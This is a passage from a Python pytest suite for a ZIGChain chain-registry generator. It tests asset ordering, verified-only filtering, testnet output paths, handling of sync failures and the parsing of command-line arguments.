    # Assert: ordered asset comes first in the output
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert len(data["assets"]) == 2
    assert data["assets"][0]["symbol"] == "USDC"
    assert data["assets"][1]["symbol"] == "ZIG"


def test_generate_for_network_prints_asset_counts_and_network_header(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
    valid_factory_asset_payload: dict[str, Any],
    valid_ibc_asset_payload: dict[str, Any],
    capsys: pytest.CaptureFixture[str],
) -> None:
    """generate_for_network prints a header with network, chain, and per-type asset counts."""

    # Arrange: one of each asset type
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    native = NativeAsset(**valid_native_asset_payload)
    factory = FactoryAsset(**valid_factory_asset_payload)
    ibc = IBCAsset(**valid_ibc_asset_payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[native],
        factories=[factory],
        ibcs=[ibc],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: header line includes network, chain name, and eth chain name (line 1028)
    captured = capsys.readouterr()
    assert "Processing network=mainnet" in captured.out
    assert "chain=zigchain" in captured.out
    assert "eth_chain=ethereum" in captured.out

    # Assert: asset counts line
    assert "native: 1" in captured.out
    assert "factory: 1" in captured.out
    assert "ibc: 1" in captured.out

    # Assert: written assetlist announcement (line 1117)
    assert "Wrote zigchain/assetlist.json with 3 assets" in captured.out

    # Assert: image copy count line is always printed even when count is 0 (line 1118)
    assert "Copied 0 zigchain image files" in captured.out

    # Assert: no ERC20-origin assets → skip message printed (line 1134)
    # (all three assets in this test are non-ethereum-origin)
    assert "No ERC20-origin assets detected for mainnet" in captured.out


def test_generate_for_network_verified_only_keeps_verified_factory_asset(
    tmp_path: Path,
    valid_factory_asset_payload: dict[str, Any],
) -> None:
    """generate_for_network with verified_only=True keeps factory assets where is_verified=True."""

    # Arrange: factory asset explicitly marked as verified
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    payload = dict(valid_factory_asset_payload)
    payload["is_verified"] = True
    factory = FactoryAsset(**payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[factory],
        ibcs=[],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=True,
    )

    # Assert: verified factory asset is included in the output
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert len(data["assets"]) == 1
    assert data["assets"][0]["symbol"] == "PANDA"


def test_generate_for_network_verified_only_keeps_verified_ibc_asset(
    tmp_path: Path,
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """generate_for_network with verified_only=True keeps IBC assets where is_verified=True."""

    # Arrange: IBC asset explicitly marked as verified
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    payload = dict(valid_ibc_asset_payload)
    payload["is_verified"] = True
    ibc = IBCAsset(**payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[],
        ibcs=[ibc],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=True,
    )

    # Assert: verified IBC asset is included in the output
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert len(data["assets"]) == 1
    assert data["assets"][0]["symbol"] == "USDC"


def test_generate_for_network_erc20_prints_ethereum_write_messages(
    tmp_path: Path,
    erc20_ibc_asset: IBCAsset,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """When ERC20-origin assets are present, the ethereum assetlist write and image count are printed."""

    # Arrange: IBC asset with ethereum origin (triggers the erc20 branch)
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[],
        ibcs=[erc20_ibc_asset],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: ethereum assetlist write is announced (line 1130)
    captured = capsys.readouterr()
    assert "Wrote _non-cosmos/ethereum/assetlist.json with 1 assets" in captured.out

    # Assert: ethereum image copy count is printed (line 1132)
    assert "Copied 0 ethereum image files" in captured.out

    # Assert: the "no ERC20 assets" skip message is NOT printed (ERC20 branch was taken)
    assert "No ERC20-origin assets detected" not in captured.out


def test_generate_for_network_erc20_testnet_path_writes_to_testnets_non_cosmos(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """ERC20-origin IBC asset with use_testnet_paths=True writes ethereum assetlist under testnets/_non-cosmos/."""

    # Arrange: ERC20-origin IBC asset with testnet paths enabled
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"

    eth_ibc = IBCAsset(
        network="testnet",
        asset_id=f"ibc/{_ERC20_HASH}",
        type="ibc",
        symbol="WETH",
        name="Wrapped Ether",
        decimals=18,
        display_denom="weth",
        base_denom=f"ibc/{_ERC20_HASH}",
        hash=_ERC20_HASH,
        origin_chain="ethereum",
        origin_denom="0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
        traces=[
            IBCTrace(
                type="ibc",
                chain_name="zigchaintestnet",
                base_denom=f"ibc/{_ERC20_HASH}",
                path="transfer/channel-5/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
            ),
        ],
        channels=[
            IBCChannel(
                zigchain_channel="channel-5",
                counterparty_chain="ethereum",
                counterparty_channel="channel-0",
            ),
        ],
        denom_units=[
            DenomUnit(denom=f"ibc/{_ERC20_HASH}", exponent=0),
            DenomUnit(denom="weth", exponent=18),
        ],
    )

    # Act
    generate_for_network(
        network="testnet",
        natives=[],
        factories=[],
        ibcs=[eth_ibc],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchaintestnet",
        eth_chain_name="ethereumtestnet",
        use_testnet_paths=True,
        verified_only=False,
    )

    # Assert: ethereum assetlist is under testnets/_non-cosmos/ for testnet runs
    eth_assetlist = out_root / "testnets" / "_non-cosmos" / "ethereumtestnet" / "assetlist.json"
    assert eth_assetlist.exists(), "ethereum assetlist must be in testnets/_non-cosmos/ when use_testnet_paths=True"

    # Assert: $schema for testnet ethereum is three levels up from the assetlist location
    eth_data = json.loads(eth_assetlist.read_text(encoding="utf-8"))
    assert eth_data["$schema"] == "../../../assetlist.schema.json"
    assert eth_data["chain_name"] == "ethereumtestnet"

    # Assert: print messages reflect the testnet paths and chain names
    captured = capsys.readouterr()
    assert "testnets/_non-cosmos/ethereumtestnet/assetlist.json" in captured.out
    assert "Copied 0 ethereumtestnet image files" in captured.out


def test_generate_for_network_two_ordered_assets_sorted_by_order_value(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
    valid_factory_asset_payload: dict[str, Any],
) -> None:
    """Two assets both with explicit order values are sorted ascending by that value."""

    # Arrange: native has order=2, factory has order=1.
    # Factory is passed last in the list to confirm input order is irrelevant.
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"

    native_payload = dict(valid_native_asset_payload)
    native_payload["order"] = 2  # should appear second
    native = NativeAsset(**native_payload)

    factory_payload = dict(valid_factory_asset_payload)
    factory_payload["order"] = 1  # should appear first
    factory = FactoryAsset(**factory_payload)

    # Act: pass native first in the list — output order must follow order field, not input position
    generate_for_network(
        network="mainnet",
        natives=[native],
        factories=[factory],
        ibcs=[],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: factory (order=1) appears before native (order=2)
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert len(data["assets"]) == 2
    assert data["assets"][0]["symbol"] == "PANDA", "Asset with order=1 must come before asset with order=2"
    assert data["assets"][1]["symbol"] == "ZIG"


def test_generate_for_network_ibc_with_logo_chain_name_prints_extra_chain_image_count(
    tmp_path: Path,
    valid_ibc_asset_payload: dict[str, Any],
    capsys: pytest.CaptureFixture[str],
) -> None:
    """IBC assets whose logo resolves to a different chain folder trigger the extra chain images print."""

    # Arrange: create a logo file; copy_images only checks existence, content is irrelevant
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    (logos_dir / "usdc.png").write_text("", encoding="utf-8")
    out_root = tmp_path / "out"

    from models.base import LogoUris
    payload = dict(valid_ibc_asset_payload)
    # chain_name="noble" routes images to noble/images/ instead of zigchain/images/.
    # png points to our repo so preserve_declared=False — slug "usdc" is derived from the URL filename.
    payload["logo_uris"] = LogoUris(
        chain_name="noble",
        png="https://raw.githubusercontent.com/ZIGChain/zigchain-registry/main/logos/usdc.png",
    )
    ibc = IBCAsset(**payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[],
        ibcs=[ibc],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: extra chain image was copied to noble/images/ instead of zigchain/images/
    noble_img = out_root / "noble" / "images" / "usdc.png"
    assert noble_img.exists()
    zigchain_img = out_root / "zigchain" / "images" / "usdc.png"
    assert not zigchain_img.exists()

    # Assert: the extra chain image count print is emitted
    captured = capsys.readouterr()
    assert "Copied 1 extra chain image files (IBC chain folders)" in captured.out


######################################################################
# Tests for generate
######################################################################


def test_generate_with_skip_sync_and_empty_assets_writes_mainnet_output(
    repo_root: Path,
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """generate with skip_sync and empty asset dirs creates correct chain folder structure and assetlist."""

    # Arrange: empty repo root — no asset files in any category
    out_root = tmp_path / "out"

    # Act
    generate(repo_root, out_root, skip_sync=True)

    # Assert: zigchain/assetlist.json written with correct structure
    assert out_root.exists()
    assetlist = out_root / "zigchain" / "assetlist.json"
    assert assetlist.exists()
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert data["chain_name"] == "zigchain"
    assert data["assets"] == []
    assert data["$schema"] == "../assetlist.schema.json"

    # Assert: all expected print messages are emitted
    captured = capsys.readouterr()
    assert "Generating chain-registry artifacts..." in captured.out
    assert "Loaded total assets -> native: 0, factory: 0, ibc: 0" in captured.out
    assert "No testnet assets detected; skipping testnet outputs" in captured.out
    assert "All chain-registry artifacts generated successfully!" in captured.out
    assert "Sync to cosmos/chain-registry skipped (--skip-sync)." in captured.out


def test_generate_creates_out_root_when_missing(
    repo_root: Path,
    tmp_path: Path,
) -> None:
    """generate creates the out_root directory if it does not already exist.

    The caller does not need to create the output folder before calling generate.
    """

    # Arrange: out_root does not exist yet
    out_root = tmp_path / "brand_new_output"
    assert not out_root.exists()

    # Act
    generate(repo_root, out_root, skip_sync=True)

    # Assert: the directory was created and the assetlist is inside it
    assert out_root.is_dir()
    assert (out_root / "zigchain" / "assetlist.json").exists()


def test_generate_verified_only_excludes_unverified_assets(
    repo_root: Path,
    tmp_path: Path,
) -> None:
    """generate passes verified_only=True through to generate_for_network.

    An unverified asset written to the assets/ folder must not appear in the
    output assetlist when the flag is set.
    """

    # Arrange: write an unverified native asset into the repo
    asset = {
        "network": "mainnet",
        "asset_id": "zig",
        "type": "native",
        "symbol": "ZIG",
        "name": "ZIGChain Native Token",
        "decimals": 6,
        "display_denom": "ZIG",
        "base_denom": "uzig",
        "is_verified": False,
        "denom_units": [
            {"denom": "uzig", "exponent": 0},
            {"denom": "zig", "exponent": 6},
        ],
    }
    import json as _json
    (repo_root / "assets" / "native" / "zig.mainnet.json").write_text(
        _json.dumps(asset), encoding="utf-8"
    )
    out_root = tmp_path / "out"

    # Act
    generate(repo_root, out_root, skip_sync=True, verified_only=True)

    # Assert: the unverified asset is excluded from the output
    data = json.loads((out_root / "zigchain" / "assetlist.json").read_text(encoding="utf-8"))
    assert data["assets"] == []


def test_generate_testnet_assets_present_writes_testnets_output(
    repo_root: Path,
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """When testnet assets are found, generate calls generate_for_network for testnet and writes testnets/ output."""

    # Arrange: write a testnet native asset into the repo
    asset = {
        "network": "testnet",
        "asset_id": "zigtest",
        "type": "native",
        "symbol": "ZIGTEST",
        "name": "ZIGChain Testnet Token",
        "decimals": 6,
        "display_denom": "ZIGTEST",
        "base_denom": "uzigtest",
        "denom_units": [
            {"denom": "uzigtest", "exponent": 0},
            {"denom": "zigtest", "exponent": 6},
        ],
    }
    (repo_root / "assets" / "native" / "zigtest.testnet.json").write_text(
        json.dumps(asset), encoding="utf-8"
    )
    out_root = tmp_path / "out"

    # Act: this test isn't about the verified-only filter — disable it so the
    # bare-fixture asset (no is_verified=True) survives.
    generate(repo_root, out_root, skip_sync=True, verified_only=False)

    # Assert: testnet assetlist is written under testnets/zigchaintestnet/
    assetlist = out_root / "testnets" / "zigchaintestnet" / "assetlist.json"
    assert assetlist.exists()
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert data["chain_name"] == "zigchaintestnet"
    assert len(data["assets"]) == 1
    assert data["assets"][0]["symbol"] == "ZIGTEST"

    # Assert: asset count includes the testnet asset; the "No testnet" skip message is absent
    captured = capsys.readouterr()
    assert "Loaded total assets -> native: 1, factory: 0, ibc: 0" in captured.out
    assert "No testnet assets detected" not in captured.out


def test_generate_no_testnet_assets_does_not_create_testnets_folder(
    repo_root: Path,
    tmp_path: Path,
) -> None:
    """When no testnet assets exist, the testnets/ output folder is never created."""

    # Arrange: empty repo root — no testnet assets in any category
    out_root = tmp_path / "out"

    # Act
    generate(repo_root, out_root, skip_sync=True)

    # Assert: testnets/ folder is absent from the output tree
    assert not (out_root / "testnets").exists()


def test_generate_mainnet_asset_not_in_testnet_output(
    repo_root: Path,
    tmp_path: Path,
) -> None:
    """Mainnet and testnet assets are partitioned: each symbol appears only in its own network output."""

    # Arrange: one mainnet native and one testnet native asset written to the repo
    mainnet_asset = {
        "network": "mainnet",
        "asset_id": "zig",
        "type": "native",
        "symbol": "ZIG",
        "name": "ZIGChain Native Token",
        "decimals": 6,
        "display_denom": "ZIG",
        "base_denom": "uzig",
        "denom_units": [
            {"denom": "uzig", "exponent": 0},
            {"denom": "zig", "exponent": 6},
        ],
    }
    testnet_asset = {
        "network": "testnet",
        "asset_id": "zigtest",
        "type": "native",
        "symbol": "ZIGTEST",
        "name": "ZIGChain Testnet Token",
        "decimals": 6,
        "display_denom": "ZIGTEST",
        "base_denom": "uzigtest",
        "denom_units": [
            {"denom": "uzigtest", "exponent": 0},
            {"denom": "zigtest", "exponent": 6},
        ],
    }
    (repo_root / "assets" / "native" / "zig.mainnet.json").write_text(
        json.dumps(mainnet_asset), encoding="utf-8"
    )
    (repo_root / "assets" / "native" / "zigtest.testnet.json").write_text(
        json.dumps(testnet_asset), encoding="utf-8"
    )
    out_root = tmp_path / "out"

    # Act: this test partitions mainnet vs testnet, not verified vs unverified,
    # so disable the filter so bare-fixture assets aren't dropped.
    generate(repo_root, out_root, skip_sync=True, verified_only=False)

    # Assert: ZIG is in mainnet output and absent from testnet output
    mainnet_data = json.loads((out_root / "zigchain" / "assetlist.json").read_text(encoding="utf-8"))
    mainnet_symbols = [a["symbol"] for a in mainnet_data["assets"]]
    assert "ZIG" in mainnet_symbols
    assert "ZIGTEST" not in mainnet_symbols

    # Assert: ZIGTEST is in testnet output and absent from mainnet output
    testnet_data = json.loads(
        (out_root / "testnets" / "zigchaintestnet" / "assetlist.json").read_text(encoding="utf-8")
    )
    testnet_symbols = [a["symbol"] for a in testnet_data["assets"]]
    assert "ZIGTEST" in testnet_symbols
    assert "ZIG" not in testnet_symbols


def test_generate_verified_only_propagated_to_testnet(
    repo_root: Path,
    tmp_path: Path,
) -> None:
    """verified_only=True filters unverified testnet assets the same way it does mainnet assets."""

    # Arrange: one verified and one unverified testnet native asset
    verified = {
        "network": "testnet",
        "asset_id": "zigtest",
        "type": "native",
        "symbol": "ZIGTEST",
        "name": "ZIGChain Testnet Token",
        "decimals": 6,
        "display_denom": "ZIGTEST",
        "base_denom": "uzigtest",
        "is_verified": True,
        "denom_units": [
            {"denom": "uzigtest", "exponent": 0},
            {"denom": "zigtest", "exponent": 6},
        ],
    }
    unverified = {
        "network": "testnet",
        "asset_id": "zig2test",
        "type": "native",
        "symbol": "ZIG2TEST",
        "name": "ZIGChain Testnet Token 2",
        "decimals": 6,
        "display_denom": "ZIG2TEST",
        "base_denom": "uzig2test",
        "is_verified": False,
        "denom_units": [
            {"denom": "uzig2test", "exponent": 0},
            {"denom": "zig2test", "exponent": 6},
        ],
    }
    (repo_root / "assets" / "native" / "zigtest.testnet.json").write_text(
        json.dumps(verified), encoding="utf-8"
    )
    (repo_root / "assets" / "native" / "zig2test.testnet.json").write_text(
        json.dumps(unverified), encoding="utf-8"
    )
    out_root = tmp_path / "out"

    # Act
    generate(repo_root, out_root, skip_sync=True, verified_only=True)

    # Assert: only the verified testnet asset appears; the unverified one is excluded
    data = json.loads(
        (out_root / "testnets" / "zigchaintestnet" / "assetlist.json").read_text(encoding="utf-8")
    )
    symbols = [a["symbol"] for a in data["assets"]]
    assert "ZIGTEST" in symbols
    assert "ZIG2TEST" not in symbols


def test_generate_sync_failure_prints_error_and_does_not_raise(
    repo_root: Path,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """When sync_to_chain_registry raises, generate prints the error and returns normally without re-raising."""

    import scripts.generate_chain_registry as gcr

    # Arrange: patch sync to raise a generic error
    def _fail(**_kw: object) -> None:
        raise RuntimeError("network unreachable")

    monkeypatch.setattr(gcr, "sync_to_chain_registry", _fail)
    out_root = tmp_path / "out"

    # Act: generate must not raise even though sync fails
    generate(repo_root, out_root, skip_sync=False)

    # Assert: failure message and error text are printed; generation success is still announced
    captured = capsys.readouterr()
    assert "❌ Sync to chain-registry failed." in captured.out
    assert "network unreachable" in captured.out
    assert "All chain-registry artifacts generated successfully!" in captured.out


def test_generate_sync_failure_with_git_stdout_prints_git_output(
    repo_root: Path,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """When sync raises CalledProcessError with stdout, generate appends the git output section to the print."""

    import scripts.generate_chain_registry as gcr

    # Arrange: build a CalledProcessError that carries stdout text, then patch sync to raise it
    err = subprocess.CalledProcessError(returncode=1, cmd=["git", "push"])
    err.stdout = "fatal: repository 'https://example.com/' not found\n"

    def _fail(**_kw: object) -> None:
        raise err

    monkeypatch.setattr(gcr, "sync_to_chain_registry", _fail)
    out_root = tmp_path / "out"

    # Act
    generate(repo_root, out_root, skip_sync=False)

    # Assert: both the generic failure message and the git stdout section are printed
    captured = capsys.readouterr()
    assert "❌ Sync to chain-registry failed." in captured.out
    assert "Git output:" in captured.out
    assert "fatal: repository" in captured.out


def test_generate_ssh_command_in_env_prints_ssh_url_message(
    repo_root: Path,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """When GIT_SSH_COMMAND is set in the environment, generate converts the fork URL to SSH and prints it."""

    import scripts.generate_chain_registry as gcr

    # Arrange: inject the SSH command into the process environment; patch sync so no git operations run
    monkeypatch.setenv("GIT_SSH_COMMAND", "ssh -i ~/.ssh/id_rsa")
    monkeypatch.setattr(gcr, "sync_to_chain_registry", lambda **_kw: None)
    out_root = tmp_path / "out"

    # Act
    generate(repo_root, out_root, skip_sync=False)

    # Assert: the SSH URL message is printed with the converted git@github.com remote
    captured = capsys.readouterr()
    assert "Using SSH fork remote (via GIT_SSH_COMMAND):" in captured.out
    assert "git@github.com:ZIGChain/chain-registry.git" in captured.out


# ----------------
# Negative tests for generate
# ----------------


def test_generate_invalid_json_in_asset_file_raises(
    repo_root: Path,
    tmp_path: Path,
) -> None:
    """generate raises JSONDecodeError when an asset file contains invalid JSON."""

    # Arrange: write a malformed JSON file into the native assets folder
    (repo_root / "assets" / "native" / "bad.mainnet.json").write_text("{ invalid }", encoding="utf-8")
    out_root = tmp_path / "out"

    # Act + Assert: generate calls load_assets internally; malformed JSON raises JSONDecodeError
    with pytest.raises(json.JSONDecodeError) as excinfo:
        generate(repo_root, out_root, skip_sync=True)

    assert "Expecting property name enclosed in double quotes" in str(excinfo.value)


def test_generate_pydantic_validation_error_on_invalid_asset_raises(
    repo_root: Path,
    tmp_path: Path,
) -> None:
    """generate raises ValidationError when an asset file has valid JSON but is missing required fields."""

    from pydantic import ValidationError

    # Arrange: write valid JSON but omit the required denom_units field for a native asset
    invalid_asset = {
        "network": "mainnet",
        "asset_id": "zig",
        "type": "native",
        "symbol": "ZIG",
        "name": "ZIGChain Native Token",
        "decimals": 6,
        "display_denom": "ZIG",
        "base_denom": "uzig",
        # denom_units intentionally omitted — required by NativeAsset
    }
    (repo_root / "assets" / "native" / "zig.mainnet.json").write_text(
        json.dumps(invalid_asset), encoding="utf-8"
    )
    out_root = tmp_path / "out"

    # Act + Assert: Pydantic raises on the missing required field when load_assets validates the file
    with pytest.raises(ValidationError) as excinfo:
        generate(repo_root, out_root, skip_sync=True)

    assert "denom_units\n  Field required [type=missing" in str(excinfo.value)



######################################################################
# Tests for parse_args
######################################################################


def test_parse_args_defaults_when_no_argv(monkeypatch: pytest.MonkeyPatch) -> None:
    """parse_args returns namespace with default root and out when sys.argv has no script args."""

    # Arrange: no extra arguments beyond the script name
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py"])

    # Act
    args = parse_args()

    # Assert: all expected attributes are present with correct default types
    assert hasattr(args, "root")
    assert hasattr(args, "out")
    assert hasattr(args, "skip_sync"), "skip_sync argument must exist in parsed args"
    assert isinstance(args.skip_sync, bool), "skip_sync must default to a boolean"


def test_parse_args_skip_sync_flag_sets_true(monkeypatch: pytest.MonkeyPatch) -> None:
    """--skip-sync flag sets skip_sync to True on the returned namespace."""

    # Arrange: simulate user passing --skip-sync on the command line
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py", "--skip-sync"])

    # Act
    args = parse_args()

    # Assert: the flag was picked up
    assert args.skip_sync is True


def test_parse_args_include_unverified_flag_sets_true(monkeypatch: pytest.MonkeyPatch) -> None:
    """--include-unverified flag sets include_unverified to True on the returned namespace.

    Replaces the obsolete --verified-only flag tests; PR #21 inverted the
    default to verified-only and renamed the opt-out flag.
    """

    # Arrange: pass --include-unverified flag
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py", "--include-unverified"])

    # Act
    args = parse_args()

    # Assert
    assert args.include_unverified is True


def test_parse_args_include_unverified_defaults_to_false(monkeypatch: pytest.MonkeyPatch) -> None:
    """include_unverified defaults to False — the production default is the
    safer verified-only filter; opting in must be explicit."""

    # Arrange: no flags passed
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py"])

    # Act
    args = parse_args()

    # Assert
    assert args.include_unverified is False


def test_parse_args_skip_sync_defaults_to_false(monkeypatch: pytest.MonkeyPatch) -> None:
    """skip_sync defaults to False when --skip-sync is not passed."""

    # Arrange: no flags passed
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py"])

    # Act
    args = parse_args()

    # Assert: omitting the flag leaves skip_sync at its default
    assert args.skip_sync is False


def test_parse_args_root_flag_sets_custom_path(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """--root flag sets root to the provided path."""

    # Arrange: pass a custom root directory
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py", "--root", str(tmp_path)])

    # Act
    args = parse_args()

    # Assert: the path is resolved and stored on the namespace
    assert args.root == tmp_path


def test_parse_args_out_flag_sets_custom_path(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """--out flag sets the output path."""

    # Arrange: pass a custom output directory (does not need to exist at parse time)
    out_path = tmp_path / "my_output"
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py", "--out", str(out_path)])

    # Act
    args = parse_args()

    # Assert
    assert args.out == out_path


def test_parse_args_git_no_prompt_flag_sets_true(monkeypatch: pytest.MonkeyPatch) -> None:
    """--git-no-prompt flag sets git_no_prompt to True."""

    # Arrange: pass the flag that suppresses interactive git prompts
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py", "--git-no-prompt"])

    # Act
    args = parse_args()

    # Assert
    assert args.git_no_prompt is True


def test_parse_args_upstream_repo_flag_sets_url(monkeypatch: pytest.MonkeyPatch) -> None:
    """--upstream-repo flag sets upstream_repo to the provided URL."""

    # Arrange: override the default cosmos/chain-registry upstream
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py", "--upstream-repo", "https://github.com/custom/chain-registry"])

    # Act
    args = parse_args()

    # Assert
    assert args.upstream_repo == "https://github.com/custom/chain-registry"


def test_parse_args_fork_repo_flag_sets_url(monkeypatch: pytest.MonkeyPatch) -> None:
    """--fork-repo flag sets fork_repo to the provided URL."""

    # Arrange: override the default ZIGChain fork remote
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py", "--fork-repo", "https://github.com/myfork/chain-registry"])

    # Act
    args = parse_args()

    # Assert
    assert args.fork_repo == "https://github.com/myfork/chain-registry"


def test_parse_args_git_env_file_flag_sets_path(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """--git-env-file flag sets git_env_file to the provided path."""

    # Arrange: point to a custom .env file for git credentials
    env_file = tmp_path / ".env"
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py", "--git-env-file", str(env_file)])

    # Act
    args = parse_args()

    # Assert
    assert args.git_env_file == env_file


def test_parse_args_git_env_file_defaults_to_none(monkeypatch: pytest.MonkeyPatch) -> None:
    """git_env_file defaults to None when --git-env-file is not passed."""

    # Arrange: no flags passed
    monkeypatch.setattr("sys.argv", ["generate_chain_registry.py"])

    # Act
    args = parse_args()

    # Assert: no env file is configured by default
    assert args.git_env_file is None







